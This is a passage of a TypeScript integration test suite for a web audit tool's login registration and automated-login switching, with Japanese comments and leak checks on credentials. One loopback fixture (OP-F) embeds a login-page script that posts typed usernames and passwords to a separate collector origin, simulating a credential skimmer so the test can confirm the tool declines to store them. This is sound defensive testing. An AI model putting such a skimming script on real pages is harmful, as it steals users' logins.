// OP-1（設計書 `doc/design/2026-10-27-beaksight-one-pass-flow-design.md` 4.1 の D1〜D4、4.1.3 の 1）: 手でのログインの値の受け取りと、ログインの直後の登録と
// 自動ログインへの切り替えを、ジョブの管理から、本物の子 process（一時のビルド）と本物の Chromium（headless）で、端から端まで確かめる結合テスト。
// - 1 回目のまとめて実行: 人の代わりに、テストだけの入口がログインの画面で ID とパスワードを入れて送る（BeakSight の画面では入れない）。「ログインを終えた」は押さない。
//   ワーカーが値を隔離した世界で読み、親の許しの後に資格情報のファイル（本物の DPAPI の部品）に書く。親が登録と切り替えを 1 回で保存する。点検と操作さがしは、
//   登録の後の設定で行う。
// - 2 回目のまとめて実行: 押すだけ。自動ログイン（テストだけの入口は手でのログインを行わない。サイトに届いたログインは 2 回目の 1 回だけ）。
// - 値（ID とパスワード）とログインの状態が、IPC（両方の向き）・ワーカーの出力・管理データ（ファイル・WAL・表）・ジョブの値に出ない。
// - 場面: フォームのログイン（`discovery-site-fixture`）と、SPA のログイン（`spa-auth-site-fixture`。token の送信先がアプリと別の Origin）。
// - Chromium: テストの既定の Chromium と、CLI の起動の設定（ログイン用・自動ログイン用・Run の Browser をそろえる）。
// 作業のディレクトリ、管理データ、出力先、資格情報のフォルダは一時のフォルダだけ。サーバは 127.0.0.1 だけで待ち受ける。
import type { ChildProcess } from 'node:child_process';
import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import { loadConfig } from '../../src/config/load-config.js';
import { SCRIPT_REQUEST_TRANSPORT, type AuthSetup } from '../../src/control/auth/auth-setup-contracts.js';
import { MIN_PROFILE_REVISION, SITE_PROFILE_SCHEMA_VERSION } from '../../src/control/contracts.js';
import { createCredentialStore } from '../../src/control/credentials/credential-store.js';
import { createAuditJobManager, type AuditJobManager, type AuditWorkerForker } from '../../src/control/job/audit-job-manager.js';
import type { StageChainView } from '../../src/control/job/stage-chain-policy.js';
import type { ProfileValidationContext } from '../../src/control/profile-policy.js';
import { getAuthSetup, saveAuthSetup } from '../../src/control/store/auth-setup-store.js';
import { saveProfileAndAuthSetup } from '../../src/control/store/profile-auth-setup-store.js';
import { closeControlDatabase, openControlDatabase, type ControlDatabase } from '../../src/control/store/control-database.js';
import { resolveControlDatabasePath } from '../../src/control/store/database-path.js';
import { createProfile, getProfile } from '../../src/control/store/profile-store.js';
import { wait as sleep } from '../../src/core/deadline.js';
import { FORM_NAVIGATION_SETUP_ITEMS } from '../helpers/auth-setup-samples.js';
import { DISCOVERY_SITE_LOGIN_FIELDS, DISCOVERY_SITE_PATHS, startDiscoverySite } from '../helpers/discovery-site-fixture.js';
import { databaseFilePlaces, databaseTablesText, placesWithMarkers, textLeakPlace } from '../helpers/leak-places.js';
import { cliTargetConfig } from '../helpers/run-harness.js';
import { SPA_APP_PATHS, SPA_LOGIN_FIELDS, startSpaAuthSite } from '../helpers/spa-auth-site-fixture.js';
import { startLoopbackHttpServer } from '../helpers/loopback-server.js';
import { buildIntoTemporaryDirectory, type TemporaryBuild } from '../helpers/temporary-build.js';
import { TEST_DEFAULT_CHROMIUM_LAUNCH_SOURCE } from '../helpers/test-chromium-args.js';
import { testLoginWorkerEntrySource } from '../helpers/test-login-worker-entry.js';
import { STDIN_CREDENTIALS_EXPRESSION, STDIN_CREDENTIALS_PRELUDE, createRecordingFork, hideJobBrowser } from '../helpers/worker-fork-support.js';

const SUITE_TIMEOUT_MS = 900_000;
const TEST_TIMEOUT_MS = 600_000;
const WAIT_LIMIT_MS = 300_000;
const WAIT_POLL_MS = 100;
const LOGIN_TIMEOUT_MS = 60_000;
const PROFILE_ID = 'example-login-registration-fork';
const TARGET_CONFIG_PATH = 'local/targets/login-registration-fork.json';
const OUTPUT_DIRECTORY_NAME = 'login-registration-fork-output';
const NAVIGATION_INTERVAL_MS = 200;
const MAX_PAGES = 6;

/** ブラウザの起動（ログイン用・自動ログイン用・Run の Browser。テストだけの入口の値。`undefined` は本番の起動）。 */
const LAUNCHERS = [
  ['the default test Chromium', 'TEST_DEFAULT', `() => ${TEST_DEFAULT_CHROMIUM_LAUNCH_SOURCE}`],
  ['the CLI launch settings', 'CLI', 'undefined'],
] as const;

/** サイト（ログインのしかた）。 */
interface SiteCase {
  readonly origin: string;
  readonly startPath: string;
  readonly setup: AuthSetup;
  readonly fields: { readonly user: string; readonly pass: string; readonly submit: string };
  readonly fillCredentials: (fill: (selector: string, value: string) => Promise<void>) => Promise<void>;
  readonly successfulLogins: () => number;
  readonly secretValues: () => readonly string[];
  readonly close: () => Promise<void>;
}

const baseSetup = Object.freeze({
  ...FORM_NAVIGATION_SETUP_ITEMS,
  profileId: PROFILE_ID,
  profileRevision: MIN_PROFILE_REVISION,
  // 開始の URL がログインの画面のときの案と同じく、成功の条件は空（手でのログインの観察が埋める）。
  successCondition: { pathPrefix: '', selector: null },
  maxLoginAttempts: 1,
  allowedIdpOrigins: [],
  automatedLogin: null,
});

const startFormSite = async (): Promise<SiteCase> => {
  const site = await startDiscoverySite({});
  return {
    origin: site.origin,
    startPath: DISCOVERY_SITE_PATHS.admin,
    setup: {
      ...baseSetup,
      loginStartUrl: `${site.origin}${DISCOVERY_SITE_PATHS.login}`,
      loginPostEndpoints: [{ origin: site.origin, path: DISCOVERY_SITE_PATHS.login }],
      sessionLostCondition: { pathPrefix: DISCOVERY_SITE_PATHS.login },
      excludedPaths: [DISCOVERY_SITE_PATHS.logout],
      auditPathPrefixes: [DISCOVERY_SITE_PATHS.admin],
    },
    fields: DISCOVERY_SITE_LOGIN_FIELDS,
    fillCredentials: (fill) => site.fillCredentials(fill),
    successfulLogins: () => site.successfulLogins,
    secretValues: () => site.loginStateValues(),
    close: () => site.close(),
  };
};

const startSpaSiteWith = async (options: Parameters<typeof startSpaAuthSite>[0]): Promise<SiteCase> => {
  const site = await startSpaAuthSite(options);
  return {
    origin: site.appOrigin,
    startPath: SPA_APP_PATHS.admin,
    setup: {
      ...baseSetup,
      loginStartUrl: `${site.appOrigin}${SPA_APP_PATHS.auth}`,
      loginPostEndpoints: [],
      sessionLostCondition: { pathPrefix: SPA_APP_PATHS.auth },
      excludedPaths: [SPA_APP_PATHS.logout],
      auditPathPrefixes: [SPA_APP_PATHS.admin],
      loginTransport: SCRIPT_REQUEST_TRANSPORT,
    },
    fields: { user: SPA_LOGIN_FIELDS.email, pass: SPA_LOGIN_FIELDS.password, submit: SPA_LOGIN_FIELDS.submit },
    fillCredentials: (fill) => site.fillCredentials(fill),
    successfulLogins: () => site.successfulLogins,
    secretValues: () => site.secretValues(),
    close: () => site.close(),
  };
};

const startSpaSite = (): Promise<SiteCase> => startSpaSiteWith({ preLoginRpc: 'required' });
/** DEF-182（OP-DEF 修正の 1 回目）: token の送信先がアプリ（テスト環境）と同じ Origin の SPA。 */
const startSameOriginSpaSite = (): Promise<SiteCase> => startSpaSiteWith({ sameOriginAuth: true });
/** OP-K（K3）: 本物のテスト環境の形の SPA（ログインの画面の欄を、開いた後に遅れて描く。token の送信先はアプリと別の Origin）。 */
const startDeferredLoginSpaSite = (): Promise<SiteCase> => startSpaSiteWith({ preLoginRpc: 'required', deferredLoginForm: true });

const SITES = [['the form login', startFormSite], ['the SPA login (token on another origin)', startSpaSite]] as const;

let build: TemporaryBuild;
const children: ChildProcess[] = [];

interface Workspace {
  readonly directory: string;
  readonly database: ControlDatabase;
  readonly site: SiteCase;
  /** 子 → 親と、親 → 子のメッセージ（IPC の両方の向き）。 */
  readonly ipc: unknown[];
  readonly typed: { username: string; password: string };
  workerOutput: string;
  manager: AuditJobManager | undefined;
  /** OP-J（J2）: プロファイルの検証の文脈（テストがプロファイルを保存し直すときに使う）。 */
  resolveContext?: () => ProfileValidationContext | undefined;
}

let workspace: Workspace | undefined;

beforeAll(async () => {
  build = await buildIntoTemporaryDirectory();
}, SUITE_TIMEOUT_MS);

afterAll(async () => {
  const leftovers = children.filter((child) => child.exitCode === null && child.signalCode === null);
  for (const child of leftovers) {
    child.kill();
  }
  await build?.remove();
  expect(leftovers.length, 'workers left running after the tests').toBe(0);
}, SUITE_TIMEOUT_MS);

afterEach(async () => {
  if (workspace === undefined) {
    return;
  }
  await workspace.manager?.close();
  await Promise.all(children.map((child) => (child.exitCode !== null || child.signalCode !== null
    ? Promise.resolve()
    : new Promise<void>((resolvePromise) => child.once('exit', () => resolvePromise())))));
  closeControlDatabase(workspace.database);
  await workspace.site.close();
  await rm(workspace.directory, { recursive: true, force: true });
  workspace = undefined;
}, SUITE_TIMEOUT_MS);

/** テストだけの入口の本文（人の代わりに、ログインの画面で標準入力の値を入れて送る。自動ログイン用と Run の Browser の起動もそろえる）。 */
const entrySourceOf = (loginLaunch: 'TEST_DEFAULT' | 'CLI', browser: string): string => testLoginWorkerEntrySource({
  distPrefix: './dist/',
  loginTimeoutMs: LOGIN_TIMEOUT_MS,
  loginLaunch,
  prelude: `${STDIN_CREDENTIALS_PRELUDE}const launchBrowser = ${browser};\n`,
  credentialsExpression: STDIN_CREDENTIALS_EXPRESSION,
  additionalHooks: [
    '\n  ...(launchBrowser === undefined ? {} : { launchRunBrowser: launchBrowser }),',
    '\n  ...(launchBrowser === undefined ? {} : { automatedLoginStage: { launchAutomatedLoginBrowser: launchBrowser } }),',
  ].join(''),
});

async function prepare(
  startSite: () => Promise<SiteCase>,
  loginLaunch: 'TEST_DEFAULT' | 'CLI',
  browser: string,
  loginPreference?: 'MANUAL_EVERY_TIME',
): Promise<AuditJobManager> {
  const directory = await mkdtemp(join(tmpdir(), 'beaksight-login-registration-fork-'));
  const site = await startSite();
  workspace = {
    directory,
    database: openControlDatabase(resolveControlDatabasePath(directory)),
    site,
    ipc: [],
    typed: { username: '', password: '' },
    workerOutput: '',
    manager: undefined,
  };
  const space = workspace;
  await mkdir(join(directory, 'local', 'targets'), { recursive: true });
  await writeFile(join(directory, TARGET_CONFIG_PATH), JSON.stringify(cliTargetConfig('login-registration-fork', site.origin, site.startPath, {
    crawl: { minNavigationIntervalMs: NAVIGATION_INTERVAL_MS, maxPages: MAX_PAGES },
    audit: { screenshots: false },
    output: { directory: join(directory, OUTPUT_DIRECTORY_NAME) },
  })), 'utf8');
  const resolveContext = async (path: string): Promise<ProfileValidationContext | undefined> =>
    (path === TARGET_CONFIG_PATH ? { targetConfig: await loadConfig(join(directory, path)) } : undefined);
  const context = await resolveContext(TARGET_CONFIG_PATH);
  const contextResolver = (): ProfileValidationContext | undefined => context;
  expect(createProfile(space.database, {
    schemaVersion: SITE_PROFILE_SCHEMA_VERSION,
    profileId: PROFILE_ID,
    revision: MIN_PROFILE_REVISION,
    targetConfigPath: TARGET_CONFIG_PATH,
    environment: 'TEST',
    mode: 'TEST_AUTH_PASSIVE',
    auth: 'MANUAL_SESSION',
    approvedTestOrigins: [site.origin],
    environmentEvidenceRef: 'evidence/example-login-registration-fork/isolation-check-1',
    ...(loginPreference === undefined ? {} : { loginPreference }),
  }, { resolveContext: contextResolver })).toMatchObject({ ok: true });
  space.resolveContext = contextResolver;
  hideJobBrowser(space.database, PROFILE_ID);
  expect(saveAuthSetup(space.database, site.setup, { resolveContext: contextResolver })).toMatchObject({ ok: true });
  const entry = join(build.rootDirectory, `${Date.now()}-login-registration-worker-test-entry.mjs`);
  await writeFile(entry, entrySourceOf(loginLaunch, browser), 'utf8');
  const fields: [string, string][] = [];
  await site.fillCredentials(async (selector, value) => {
    fields.push([selector, value]);
    if (selector === site.fields.user) space.typed.username = value; else space.typed.password = value;
  });
  const manualCredentials = JSON.stringify({ fields, submit: site.fields.submit });
  const recordingFork: AuditWorkerForker = createRecordingFork({
    entry,
    stdinText: () => manualCredentials,
    onChild: (child) => children.push(child),
    onReceived: (message) => { space.ipc.push(message); },
    onSent: (message) => { space.ipc.push(message); },
    onOutput: (chunk) => { space.workerOutput += chunk; },
  });
  space.manager = createAuditJobManager({
    database: space.database,
    repositoryRoot: directory,
    workerPath: join(build.distDirectory, 'worker', 'audit-worker.js'),
    resolveContext,
    forkWorker: recordingFork,
  });
  return space.manager;
}

async function waitForChainEnd(manager: AuditJobManager, chainId: string): Promise<StageChainView> {
  const deadline = Date.now() + WAIT_LIMIT_MS;
  for (;;) {
    const chain = manager.getStageChainOfJob(chainId);
    const jobs = (chain?.stages ?? []).flatMap(({ jobId }) => (jobId === null ? [] : [manager.getAuditJob(jobId)]));
    if (chain !== null && chain.state !== 'RUNNING' && jobs.every((job) => job?.finishedAt !== null) && manager.runningWorkerCount() === 0) {
      return chain;
    }
    if (Date.now() > deadline) {
      throw new Error(`the chain did not end: ${JSON.stringify(chain)}`);
    }
    await sleep(WAIT_POLL_MS);
  }
}

const startChain = async (manager: AuditJobManager): Promise<string> => {
  const revision = getProfile(workspace?.database as ControlDatabase, PROFILE_ID)?.profile.revision ?? 0;
  const started = await manager.startStageChain({ profileId: PROFILE_ID, expectedRevision: revision, startNew: true });
  if (!started.ok) {
    throw new Error(`the chain did not start: ${JSON.stringify(started)}`);
  }
  return started.job.jobId;
};

/** 値とログインの状態が出た場所（IPC の両方の向き、ワーカーの出力、管理データのファイル・WAL・表、ジョブの値）。 */
const leakedPlaces = (): readonly string[] => {
  const space = workspace as Workspace;
  const databasePath = resolveControlDatabasePath(space.directory);
  const markers = [space.typed.username, space.typed.password, ...space.site.secretValues()];
  return placesWithMarkers([
    ...databaseFilePlaces(databasePath),
    textLeakPlace('tables', databaseTablesText(databasePath, ['jobs', 'profiles', 'auth_setups', 'credential_events'])),
    textLeakPlace('ipc', JSON.stringify(space.ipc)),
    textLeakPlace('worker output', space.workerOutput),
    textLeakPlace('job views', JSON.stringify(space.manager?.listAuditJobs() ?? [])),
  ], markers.filter((marker) => marker.length > 0));
};

const typesOf = (messages: readonly unknown[]): readonly unknown[] =>
  messages.map((message) => (typeof message === 'object' && message !== null ? (message as Record<string, unknown>)['type'] : null));

describe.each(LAUNCHERS)('OP-1: receive the typed credential and switch to the automated login with %s', (_label, loginLaunch, browser) => {
  it.each(SITES)('%s: the first chain receives and switches, the second chain logs in automatically, and no value leaks', async (_site, startSite) => {
    const manager = await prepare(startSite, loginLaunch, browser);
    const space = workspace as Workspace;
    // 1 回目: 手でのログイン（人の代わりにテストだけの入口が入れる）。
    const first = await waitForChainEnd(manager, await startChain(manager));
    expect(first.stages.map(({ kind, state }) => [kind, state])).toEqual([['AUDIT', 'DONE'], ['DISCOVERY', 'DONE'], ['READ_CHECK', 'NOT_NEEDED']]);
    expect(typesOf(space.ipc)).toContain('CREDENTIAL_SAVE_ALLOWED');
    expect(typesOf(space.ipc)).toContain('CREDENTIAL_SAVED');
    expect(typesOf(space.ipc)).toContain('LOGIN_REGISTERED');
    expect(typesOf(space.ipc)).not.toContain('LOGIN_CONFIRMED');
    const profile = getProfile(space.database, PROFILE_ID)?.profile;
    expect(profile?.auth).toBe('AUTOMATED_LOGIN');
    const setup = getAuthSetup(space.database, PROFILE_ID)?.setup;
    expect(setup?.successCondition.pathPrefix).not.toBe('');
    // 資格情報のファイル（本物の DPAPI の部品）に、入れた値と同じ値がある（比べは真偽だけ）。
    const store = createCredentialStore(space.directory);
    const decrypted = await store.decrypt(PROFILE_ID, space.site.origin);
    expect(decrypted.username === space.typed.username && decrypted.password === space.typed.password).toBe(true);
    const loginsAfterFirst = space.site.successfulLogins();
    expect(loginsAfterFirst).toBe(1);
    // 2 回目: 押すだけ（自動ログイン）。
    const ipcBefore = space.ipc.length;
    const second = await waitForChainEnd(manager, await startChain(manager));
    expect(second.stages.map(({ kind, state }) => [kind, state])).toEqual([['AUDIT', 'DONE'], ['DISCOVERY', 'DONE'], ['READ_CHECK', 'NOT_NEEDED']]);
    const secondStart = space.ipc.slice(ipcBefore).find((message) => (message as Record<string, unknown>)['type'] === 'START') as
      { readonly authentication?: { readonly automatedLogin?: unknown; readonly loginRegistration?: unknown } } | undefined;
    expect(secondStart?.authentication?.automatedLogin).toBeDefined();
    expect(secondStart?.authentication?.loginRegistration).toBeUndefined();
    expect(space.site.successfulLogins()).toBe(loginsAfterFirst + 1);
    // 値とログインの状態は、どこにも出ない。
    expect(leakedPlaces()).toEqual([]);
  }, TEST_TIMEOUT_MS);
});

// DEF-182（OP-DEF 修正の 1 回目。案 (b)）: token の送信先がテスト環境と同じ Origin の SPA では、送信先を登録できない（token の送信先はサービスの Origin で、サービスの
// Origin は許可 Origin と重なれない。安全の境目は変えない）。ログインの直後の登録は送信先を足さず（`PROFILE_INVALID` にならない）、自動ログインへ切り替えずに
// 手動のログインのまま点検を続ける。受け取った値は書かずに捨てる（許しを送らない）。テストの既定の Chromium だけ（設計者の指示）。
describe('DEF-182: a SPA whose token request goes to the same origin as the test environment', () => {
  const [, loginLaunch, browser] = LAUNCHERS[0];
  it('keeps the manual login, adds no service origin, writes no credential, and marks the automated login as not available', async () => {
    const manager = await prepare(startSameOriginSpaSite, loginLaunch, browser);
    const space = workspace as Workspace;
    const chainId = await startChain(manager);
    const chain = await waitForChainEnd(manager, chainId);
    expect(chain.stages.map(({ kind, state }) => [kind, state])).toEqual([['AUDIT', 'DONE'], ['DISCOVERY', 'DONE'], ['READ_CHECK', 'NOT_NEEDED']]);
    expect(space.site.successfulLogins()).toBe(1);
    expect(typesOf(space.ipc)).not.toContain('CREDENTIAL_SAVE_ALLOWED');
    expect(typesOf(space.ipc)).not.toContain('CREDENTIAL_SAVED');
    expect(typesOf(space.ipc)).not.toContain('LOGIN_CONFIRMED');
    // 登録は、観察した成功の画面の path だけ（送信先も承認したサービスの Origin も足さない）。切り替えは「使えない」。
    expect(manager.getAuditJob(chainId)?.loginStage?.autoRegistration).toMatchObject({ addedServiceOrigins: [], automatedLogin: 'NOT_AVAILABLE' });
    const profile = getProfile(space.database, PROFILE_ID)?.profile;
    expect(profile?.auth).toBe('MANUAL_SESSION');
    expect(profile?.approvedServiceOrigins ?? []).toEqual([]);
    const setup = getAuthSetup(space.database, PROFILE_ID)?.setup;
    expect(setup?.scriptLogin ?? null).toBeNull();
    expect(setup?.successCondition.pathPrefix).not.toBe('');
    expect(await createCredentialStore(space.directory).readMetadata(PROFILE_ID)).toBeNull();
    expect(leakedPlaces()).toEqual([]);
  }, TEST_TIMEOUT_MS);
});

// OP-F（安全のレビュー OP-REV の M-2。場面 C）: 画面が、入れた値を許可 Origin の外（別の port）へ送り、値のない POST でセッションを作るサイト。受け取った値の送り先
// （`carriedBy`）が、切り替えの後の資格情報の送り先（フォームの送信先）に当たらないので、自動ログインへ切り替えない（値は書かずに捨てる）。2 つの Chromium で順に。
/** 場面 C の path。 */
const OUTSIDE_PATHS = Object.freeze({ login: '/login', admin: '/admin', list: '/admin/list', logout: '/admin/logout', collect: '/collect' } as const);
const OUTSIDE_FIELDS = Object.freeze({ user: '#user', pass: '#pass', submit: '#go' } as const);

const startValuesOutsideSite = async (): Promise<SiteCase & { readonly collected: () => number }> => {
  const credentials = { user: `u${Date.now().toString(36)}c`, pass: `p${Math.random().toString(36).slice(2)}c` };
  const sessions = new Set<string>();
  let collected = 0;
  let logins = 0;
  const collector = await startLoopbackHttpServer((request, response) => {
    request.resume();
    request.on('end', () => {
      if (request.method === 'POST') {
        collected += 1;
      }
      response.writeHead(204, { 'access-control-allow-origin': '*' });
      response.end();
    });
  });
  const html = (body: string): string => `<!doctype html><html lang="ja"><head><meta charset="utf-8"><title>t</title><link rel="icon" href="data:,"></head><body><main>${body}</main></body></html>`;
  const site = await startLoopbackHttpServer((request, response) => {
    const url = new URL(request.url ?? '/', 'http://127.0.0.1');
    request.resume();
    request.on('end', () => {
      const cookie = /(?:^|;\s*)sid=([^;]+)/u.exec(request.headers.cookie ?? '')?.[1];
      if (request.method === 'POST' && url.pathname === OUTSIDE_PATHS.login) {
        // 値のない POST でセッションを作る（値は、画面が別の Origin へ送った）。
        logins += 1;
        const sid = `s${Date.now().toString(36)}${logins}`;
        sessions.add(sid);
        response.writeHead(303, { location: OUTSIDE_PATHS.admin, 'set-cookie': `sid=${sid}; HttpOnly; SameSite=Lax; Path=/` });
        response.end();
        return;
      }
      if (url.pathname === OUTSIDE_PATHS.login) {
        response.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' });
        response.end(html(`<h1>ログイン</h1><form id="login-form" method="post" action="${OUTSIDE_PATHS.login}">`
          + '<input id="user" type="text"><input id="pass" type="password"><button id="go" type="submit">ログイン</button></form>'
          + `<script>document.getElementById('login-form').addEventListener('submit', (event) => { event.preventDefault();
            const form = event.target; const u = document.getElementById('user').value; const p = document.getElementById('pass').value;
            fetch(${JSON.stringify(collector.origin + OUTSIDE_PATHS.collect)}, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ u, p }) })
              .catch(() => undefined).finally(() => form.submit()); });</script>`));
        return;
      }
      if (url.pathname === OUTSIDE_PATHS.admin || url.pathname.startsWith(`${OUTSIDE_PATHS.admin}/`)) {
        if (cookie === undefined || !sessions.has(cookie)) {
          response.writeHead(303, { location: OUTSIDE_PATHS.login });
          response.end();
          return;
        }
        response.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' });
        response.end(html(`<h1>管理</h1><ul><li><a href="${OUTSIDE_PATHS.list}">一覧</a></li><li><a href="${OUTSIDE_PATHS.logout}">ログアウト</a></li></ul>`));
        return;
      }
      response.writeHead(404, { 'content-type': 'text/plain' });
      response.end('');
    });
  });
  return {
    origin: site.origin,
    startPath: OUTSIDE_PATHS.admin,
    setup: {
      ...baseSetup,
      loginStartUrl: `${site.origin}${OUTSIDE_PATHS.login}`,
      loginPostEndpoints: [{ origin: site.origin, path: OUTSIDE_PATHS.login }],
      sessionLostCondition: { pathPrefix: OUTSIDE_PATHS.login },
      excludedPaths: [OUTSIDE_PATHS.logout],
      auditPathPrefixes: [OUTSIDE_PATHS.admin],
    },
    fields: OUTSIDE_FIELDS,
    fillCredentials: async (fill) => {
      await fill(OUTSIDE_FIELDS.user, credentials.user);
      await fill(OUTSIDE_FIELDS.pass, credentials.pass);
    },
    successfulLogins: () => logins,
    secretValues: () => [credentials.user, credentials.pass, ...sessions],
    collected: () => collected,
    close: async () => {
      await site.close();
      await collector.close();
    },
  };
};

describe.each(LAUNCHERS)('OP-F M-2: the typed value went outside the allowed origin with %s', (_label, loginLaunch, browser) => {
  it('does not switch to the automated login, writes no credential, and keeps the manual login', async () => {
    let outside: Awaited<ReturnType<typeof startValuesOutsideSite>> | undefined;
    const manager = await prepare(async () => {
      outside = await startValuesOutsideSite();
      return outside;
    }, loginLaunch, browser);
    const space = workspace as Workspace;
    const chainId = await startChain(manager);
    const chain = await waitForChainEnd(manager, chainId);
    expect(chain.stages.map(({ kind, state }) => [kind, state])).toEqual([['AUDIT', 'DONE'], ['DISCOVERY', 'DONE'], ['READ_CHECK', 'NOT_NEEDED']]);
    // 前提: 画面は値を許可 Origin の外へ送り、値のない POST でログインした。
    expect(outside?.collected()).toBeGreaterThan(0);
    expect(space.site.successfulLogins()).toBe(1);
    expect(typesOf(space.ipc)).not.toContain('CREDENTIAL_SAVE_ALLOWED');
    expect(typesOf(space.ipc)).not.toContain('CREDENTIAL_SAVED');
    expect(manager.getAuditJob(chainId)?.loginStage?.autoRegistration).toMatchObject({ automatedLogin: 'NOT_AVAILABLE' });
    expect(getProfile(space.database, PROFILE_ID)?.profile.auth).toBe('MANUAL_SESSION');
    expect(getAuthSetup(space.database, PROFILE_ID)?.setup.automatedLogin ?? null).toBeNull();
    expect(await createCredentialStore(space.directory).readMetadata(PROFILE_ID)).toBeNull();
    expect(leakedPlaces()).toEqual([]);
  }, TEST_TIMEOUT_MS);
});

// OP-J（J2。設計書 4.1.6）: 前の手でのログインの登録で設定がすでにそろっていて、ログインの直後の登録に足すものがない（設定が変わらない）プロファイルでも、受け取った値が
// あり 4.1.3 の条件（照らし `carriedBy`・3 つのセレクタ・ファイルがない・`loginPreference`・DEF-182）がそろえば、資格情報を保存して自動ログインへ切り替える。次の点検は
// 自動ログイン。テストの既定の Chromium だけ（指示書）。
describe('OP-J (J2): switch to the automated login when the registration has nothing to add', () => {
  const [, loginLaunch, browser] = LAUNCHERS[0];
  it.each(SITES)('%s: the chain after a completed registration receives and switches, and the next chain logs in automatically', async (_site, startSite) => {
    // 前提: 毎回手でログインするプロファイルで 1 回点検し、登録だけをそろえる（受け取らない。切り替えない）。
    const manager = await prepare(startSite, loginLaunch, browser, 'MANUAL_EVERY_TIME');
    const space = workspace as Workspace;
    await waitForChainEnd(manager, await startChain(manager));
    expect(typesOf(space.ipc)).not.toContain('CREDENTIAL_SAVE_ALLOWED');
    const registered = getProfile(space.database, PROFILE_ID)?.profile;
    const registeredSetup = getAuthSetup(space.database, PROFILE_ID)?.setup;
    if (registered === undefined || registeredSetup === undefined) {
      throw new Error('the registration was not saved');
    }
    expect(registered.auth).toBe('MANUAL_SESSION');
    // 希望を自動ログインに戻す（設定の中身は変えない。改訂だけを進める）。
    const preferenceRevision = registered.revision + 1;
    const { loginPreference: _preference, ...automatic } = registered;
    expect(saveProfileAndAuthSetup(space.database, {
      profile: { ...automatic, revision: preferenceRevision },
      expectedRevision: registered.revision,
      setup: { ...registeredSetup, profileRevision: preferenceRevision },
    }, { resolveContext: () => space.resolveContext?.() })).toMatchObject({ ok: true });
    // 2 回目: 手でのログイン。登録に足すものはないが、受け取った値で切り替える（改訂が進むのは、切り替えの保存の 1 回だけ）。
    const ipcBeforeSecond = space.ipc.length;
    const secondId = await startChain(manager);
    const second = await waitForChainEnd(manager, secondId);
    expect(second.stages.map(({ kind, state }) => [kind, state])).toEqual([['AUDIT', 'DONE'], ['DISCOVERY', 'DONE'], ['READ_CHECK', 'NOT_NEEDED']]);
    const secondTypes = typesOf(space.ipc.slice(ipcBeforeSecond));
    expect(secondTypes).toContain('CREDENTIAL_SAVE_ALLOWED');
    expect(secondTypes).toContain('CREDENTIAL_SAVED');
    expect(manager.getAuditJob(secondId)?.loginStage?.autoRegistration).toMatchObject({ result: 'SAVED', automatedLogin: 'SWITCHED' });
    const switched = getProfile(space.database, PROFILE_ID)?.profile;
    expect(switched).toMatchObject({ auth: 'AUTOMATED_LOGIN', revision: preferenceRevision + 1 });
    expect(second.profileRevision).toBe(preferenceRevision + 1);
    const decrypted = await createCredentialStore(space.directory).decrypt(PROFILE_ID, space.site.origin);
    expect(decrypted.username === space.typed.username && decrypted.password === space.typed.password).toBe(true);
    const loginsAfterSecond = space.site.successfulLogins();
    // 3 回目: 押すだけ（自動ログイン）。
    const ipcBeforeThird = space.ipc.length;
    await waitForChainEnd(manager, await startChain(manager));
    const thirdStart = space.ipc.slice(ipcBeforeThird).find((message) => (message as Record<string, unknown>)['type'] === 'START') as
      { readonly authentication?: { readonly automatedLogin?: unknown; readonly loginRegistration?: unknown } } | undefined;
    expect(thirdStart?.authentication?.automatedLogin).toBeDefined();
    expect(thirdStart?.authentication?.loginRegistration).toBeUndefined();
    expect(space.site.successfulLogins()).toBe(loginsAfterSecond + 1);
    expect(leakedPlaces()).toEqual([]);
  }, TEST_TIMEOUT_MS);
});

// OP-K（K3。本物のテスト環境で分かった形を、名前を伏せて写したもの）: ログインの画面の欄を遅れて描く SPA（form の置き場所は同じ・action なし・送り方は SCRIPT_REQUEST・
// token の送信先は別の Origin）で、ログインの設定がもうある（前の点検で登録した）プロファイル。前は、手でのログインの観察の始めに欄がまだなく（`loginFields` が入らない）、
// 切り替えが `NOT_AVAILABLE` になっていた。また、切り替えた後の自動ログインも、欄を待たずに数えて失敗していた。
// - 手でのログインの観察の始めと、自動ログインの段は、欄が見えるまで同じ部品（`waitForLoginFields`）で待つ（数えるだけ。上限は 1 段の上限）。
// - 2 回目の点検で、資格情報を保存して自動ログインへ切り替える（照らし `carriedBy` は今のまま）。3 回目は自動ログイン。
// - 観察に欄の場所がないときに、最後の下調べの案から取る道は、偽のワーカーの `control-login-registration.test.ts` で確かめる。
// - 値とログインの状態は、IPC・ワーカーの出力・管理データ・ジョブの値に出ない。テストの既定の Chromium だけ（指示書）。
describe('OP-K (K3): a SPA whose login fields appear after the page opens', () => {
  const [, loginLaunch, browser] = LAUNCHERS[0];
  it('switches after the manual login that waited for the fields, and the next chain logs in automatically after waiting for the fields', async () => {
    // 前提: 毎回手でログインするプロファイルで 1 回点検し、登録だけをそろえる（J2 と同じ準備）。
    const manager = await prepare(startDeferredLoginSpaSite, loginLaunch, browser, 'MANUAL_EVERY_TIME');
    const space = workspace as Workspace;
    await waitForChainEnd(manager, await startChain(manager));
    const registered = getProfile(space.database, PROFILE_ID)?.profile;
    const registeredSetup = getAuthSetup(space.database, PROFILE_ID)?.setup;
    if (registered === undefined || registeredSetup === undefined) {
      throw new Error('the registration was not saved');
    }
    expect(registeredSetup.scriptLogin).not.toBeNull();
    const preferenceRevision = registered.revision + 1;
    const { loginPreference: _preference, ...automatic } = registered;
    expect(saveProfileAndAuthSetup(space.database, {
      profile: { ...automatic, revision: preferenceRevision },
      expectedRevision: registered.revision,
      setup: { ...registeredSetup, profileRevision: preferenceRevision },
    }, { resolveContext: () => space.resolveContext?.() })).toMatchObject({ ok: true });

    // 2 回目: 手でのログイン。観察の始めに欄を待つので、欄の場所が観察に入り、切り替える。
    const ipcBeforeSecond = space.ipc.length;
    const secondId = await startChain(manager);
    await waitForChainEnd(manager, secondId);
    const secondTypes = typesOf(space.ipc.slice(ipcBeforeSecond));
    expect(secondTypes).toContain('CREDENTIAL_SAVE_ALLOWED');
    expect(secondTypes).toContain('CREDENTIAL_SAVED');
    expect(manager.getAuditJob(secondId)?.loginStage?.observation?.loginFields)
